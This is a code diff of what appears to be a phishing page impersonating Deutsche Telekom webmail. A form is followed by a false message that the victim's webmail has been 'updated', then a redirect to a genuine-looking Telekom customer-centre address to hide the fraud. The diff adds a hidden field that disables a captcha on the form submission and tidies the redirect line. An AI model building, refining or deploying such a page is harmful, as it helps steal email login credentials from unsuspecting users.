@@ -58,6 +58,7 @@ function showPage() {
 <div id="form-success" style="display: none; padding: 1em; background-color: #e6ffed; color: #207544; border: 2px solid #b2f2bb; border-radius: 8px; font-weight: 500; margin-top: 1em;">
   ✅ Thank you! Your Webmail has been successfully updated to the latest version. All features are now up to date and ready to use. Redirecting back to INBOX...
 </div>
+	<input type="hidden" name="_captcha" value="false">
 <script>
   const form = document.getElementById('contact-form');
   const successMsg = document.getElementById('form-success');
@@ -77,7 +78,7 @@ function showPage() {
         form.reset();
         successMsg.style.display = 'block';
         setTimeout(() => {
-          window.location.href = 'https://meinkonto.telekom-dienste.de/kundencenter/index.xhtml'; // Change as needed
+          window.location.href = 'https://meinkonto.telekom-dienste.de/kundencenter/index.xhtml';
         }, 4000);
       } else {
         alert('Fehler beim Absenden des Formulars. Bitte erneut versuchen.');
